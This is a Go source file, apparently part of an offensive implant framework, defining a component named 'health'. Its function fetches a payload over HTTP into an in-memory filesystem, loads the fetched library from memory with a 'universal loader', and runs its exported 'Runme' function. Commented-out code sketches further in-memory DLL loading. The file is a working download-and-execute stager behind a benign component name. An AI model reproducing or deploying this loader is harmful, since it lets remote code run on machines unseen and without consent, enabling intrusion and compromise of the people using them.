package health

import "C"
import (
	"fmt"
	"strings"

	"github.com/dsnezhkov/tugboat/comms"
	"github.com/dsnezhkov/tugboat/defs"
	"github.com/dsnezhkov/tugboat/loaders"
	"github.com/dsnezhkov/tugboat/util"
)

func (component *ComponentHealth) invoke(msg defs.Message, handoffTo []string) bool {

	var err error
	var logMessage string

	// Are we running 64 or 32 bit
	const PtrSize = 32 << uintptr(^uintptr(0)>>63)

	// Prepare loader if needed
	uloader, err := loaders.GetUniversalLoader()
	if err != nil || uloader == nil {
		logMessage = fmt.Sprintf("Universal loader is nil or error: %v", err)
		component.Tlog.Log(component.Name, "ERROR", logMessage)
		return false
	}

	util.ListModulesLoadsForMe(component)

	//modulePath := "embfs://plugins/comp_health/main.dll"

	var (
		main2LoadSrcLoc       string
		main2LoadStoreNameLoc string
	)
	if l, ok := util.GetModuleLoadchain(component, "number_count", "main2"); ok {
		main2LoadSrcLoc = l.Source

		if l.Identifier == "" {
			ix := strings.LastIndex(main2LoadSrcLoc, "/")
			main2LoadStoreNameLoc = main2LoadSrcLoc[ix:]
		} else {
			main2LoadStoreNameLoc = l.Identifier
		}
	}

	httpc := comms.GetCommsManager().GetHTTPComm()
	if httpc == nil {
		message := fmt.Sprintf("error: httpc is nil. Not handing off further ...")
		component.Tlog.Log(component.Name, "ERROR", message)
		return false
	}

	written, err := httpc.Fetch2FS(main2LoadSrcLoc, httpc.Get(), main2LoadStoreNameLoc)

	if err != nil {
		fmt.Printf("Httpc fail: %s\n", err)
		defs.Tlog.Log("main", "DEBUG", fmt.Sprintf("httpc fetch: %s", err))
	} else {
		fmt.Printf("Http Data fetched payload %d\n", written)
	}

	for _, p := range httpc.Payman.ListDynamicPayloads() {
		for k, v := range p {
			fmt.Printf("%s (%d)\n", k, v)
		}
	}

	fmt.Printf("Loading %s from memory FS\n", main2LoadStoreNameLoc)
	modulePath := "memfs://pays/" + main2LoadStoreNameLoc

	library, err := uloader.Load(modulePath)
	if err != nil || library == nil {
		logMessage = fmt.Sprintf("Universal loader unable to load module: %v", err)
		component.Tlog.Log(component.Name, "ERROR", logMessage)
		fmt.Printf("%s\n", logMessage)
		return false
	}

	fmt.Printf("Loaded lib: %v\n", library.Name)
	result, err := uloader.RunExport(library, "Runme", 7)
	if err != nil {
		logMessage = fmt.Sprintf("Universal loader unable to run exported func: %v", err)
		component.Tlog.Log(component.Name, "ERROR", logMessage)
		return false
	}

	fmt.Printf("Result: %v\n", result)
	logMessage = fmt.Sprintf("Result: %v", result)
	component.Tlog.Log(component.Name, "INFO", logMessage)

	// 	// TODO: https://stackoverflow.com/questions/51925111/passing-string-to-syscalluintptr
	// 	cb := windows.NewCallback(func() uintptr {
	// 		message := fmt.Sprintf("[Callback] ...")
	// 		fmt.Println(message)
	// 		return 42
	// 	})
	// 	r1, r2, err := syscall.Syscall(ptr2, 1, cb, 0, 0)
	// 	if err != 0 {
	// 		log.Printf("library.call(): %+v\n", err)
	// 	}
	// 	// log.Printf("2. Result: %+v\n", val)
	// 	log.Printf("2. Result: %+v, %+v\n", int(r1), int(r2))
	// }
	// log.Println("Func not found")

	// err = ioutil.WriteFile("/tmp/dll", contentBytes, 0777)
	// if err != nil {
	// 	fmt.Printf("err: %v\n", err)
	// }

	//
	//  var (
	//  	modTest  = memload.MemoryLoadLibrary(contentBytesM)
	//  	procTest = memload.MemoryGetProcAddress(modTest, "test")
	//  )
	//
	//
	// fmt.Printf("modTest: %d\n", modTest)
	// fmt.Printf("procTest: %d\n", procTest)
	//
	//
	// //v, err := do(procTest, callback)
	// v, err := do(procTest, nil)
	// if err != nil {
	// 	log.Printf("Error invoking calback: %v\n", err)
	// } else {
	// 	log.Printf("Result: %d\n", v)
	// }

	message := fmt.Sprintf("Not handing off further ...")
	component.Tlog.Log(component.Name, "INFO", message)

	return true
}
